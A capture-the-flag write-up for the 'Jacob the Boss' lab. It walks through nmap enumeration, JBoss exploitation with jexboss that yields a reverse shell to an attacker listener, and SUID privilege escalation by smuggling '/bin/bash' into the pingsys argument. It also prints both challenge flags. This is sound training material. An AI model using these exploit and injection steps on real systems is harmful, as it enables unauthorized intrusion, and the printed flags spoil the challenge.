**Jacob the Boss**

Find a way in and learn a little more.

Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt.

First of all, add the `jacobtheboss.box` address to your hosts file.

Anyway, learn a little more, have fun!


# user.txt

## Vhost

Let's add the vhost first, as mentionned in the description of the challenge:

~~~
$ echo "10.10.156.161 jacobtheboss.box" | sudo tee -a /etc/hosts
~~~

## Services enumeration

Nmap reveals that the server is quite open (probably no firewall) and several open ports are open, which leaves some room for vulnerabilities/exploits.

~~~
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp open  mysql       MariaDB (unauthorized)
4444/tcp open  java-rmi    Java RMI
4445/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss&trade;
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
~~~

## Port 80 (DotClear)

A Dotclear blog is running on port 80/tcp. We'll come to this later if no other vulnerability is found.

## Port 8080 (JBOSS)

A JBOSS server is running on that port. Clicking on the "JBoss Web Console" link reveals that the version is 5.0.0. Searching for exploits affecting this version reveals several deserialization flaws, and a tool is available to automate the discovery of vulnerabilities against JBOSS: https://github.com/joaomatosf/jexboss.

Let's download, install, and run it on our Kali machine:

~~~
kali@kali:/data/Jacob_the_Boss/files/jexboss$ python jexboss.py -u http://jacobtheboss.box:8080/
 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * | 
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://jacobtheboss.box:8080/ **

 [*] Checking admin-console:                  [ OK ]
 [*] Checking Struts2:                        [ OK ]
 [*] Checking Servlet Deserialization:        [ OK ]
 [*] Checking Application Deserialization:    [ OK ]
 [*] Checking Jenkins:                        [ OK ]
 [*] Checking web-console:                    [ VULNERABLE ]
 [*] Checking jmx-console:                    [ VULNERABLE ]
 [*] Checking JMXInvokerServlet:              [ VULNERABLE ]


 * Do you want to try to run an automated exploitation via "web-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://jacobtheboss.box:8080/. Please wait...
~~~

At this stage, you can start a listener in another window (`rlwrap nc -nlvp 4444`) and provide `jexboss` with your local IP and port (the `RHOST` and `RPORT` are a bit confusing as it shoudl actually be `LHOST` and `LPORT`).

~~~
 * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.
   OBS: You can also use the --cmd "command" to send specific commands to run on the server.
   IP Address (RHOST): 10.8.50.72
   Port (RPORT): 4444

 * The exploit code was successfully sent. Check if you received the reverse shell
   connection on your server or if your command was executed. 
   Type [ENTER] to continue...
~~~

The listener receives a connection from the target and spawns a reverse shell:

~~~
kali@kali:/data/vpn$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.156.161] 43552
bash: no job control in this shell
[jacob@jacobtheboss /]$ id
id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
~~~

## User flag

We are connected as `jacob` and we can read the user flag:

~~~
[jacob@jacobtheboss /]$ cd
cd
[jacob@jacobtheboss ~]$ cat user.txt
cat user.txt
f4d491f280de360cc49e26ca1587cbcc
~~~

User flag: `f4d491f280de360cc49e26ca1587cbcc`


# root.txt

## Rabbit hole (database)

Analyzing the source code of the DotClear installation, I was able to access the configuration file and see that the connection to the MySQL database as `root` is granted without password. I dumped the `dc_user` table and extracted the hash but was unsuccessful in cracking it with John.

## Root files with SUID bit set

In the meantime, I kept enumerating the target and noticed that there is an unusual program owned by root with the SUID bit set:

~~~
[jacob@jacobtheboss mail]$ find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/usr/bin/pingsys  <------------- interesting!
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
~~~

## pingsys

The program expects a program, and as its name suggests, it should be an IP address to ping.

~~~
[jacob@jacobtheboss mail]$ /usr/bin/pingsys 10.8.50.72
/usr/bin/pingsys 10.8.50.72
PING 10.8.50.72 (10.8.50.72) 56(84) bytes of data.
64 bytes from 10.8.50.72: icmp_seq=1 ttl=63 time=46.2 ms
64 bytes from 10.8.50.72: icmp_seq=2 ttl=63 time=225 ms
64 bytes from 10.8.50.72: icmp_seq=3 ttl=63 time=207 ms
64 bytes from 10.8.50.72: icmp_seq=4 ttl=63 time=71.5 ms

--- 10.8.50.72 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 46.203/137.642/225.427/79.531 ms
~~~

Playing a bit with the expected parameter, I eventually confirmed that the program is vulnerable to injection, as I was able to append commands to the IP, which will be executed as root. Let's append `/bin/bash` to get a root shell:

~~~
[jacob@jacobtheboss mail]$ /usr/bin/pingsys "10.8.50.72;/bin/bash"
/usr/bin/pingsys "10.8.50.72;/bin/bash"
PING 10.8.50.72 (10.8.50.72) 56(84) bytes of data.
64 bytes from 10.8.50.72: icmp_seq=1 ttl=63 time=46.2 ms
64 bytes from 10.8.50.72: icmp_seq=2 ttl=63 time=61.8 ms
64 bytes from 10.8.50.72: icmp_seq=3 ttl=63 time=294 ms
64 bytes from 10.8.50.72: icmp_seq=4 ttl=63 time=271 ms

--- 10.8.50.72 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 46.259/168.534/294.567/114.923 ms
[root@jacobtheboss mail]# id
id
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
~~~

## Root flag

Now elevated to `root`, we can get the root flag:

~~~
[root@jacobtheboss mail]# cat /root/root.txt
cat /root/root.txt
29a5641eaa0c01abe5749608c8232806
~~~

Root flag: `29a5641eaa0c01abe5749608c8232806`
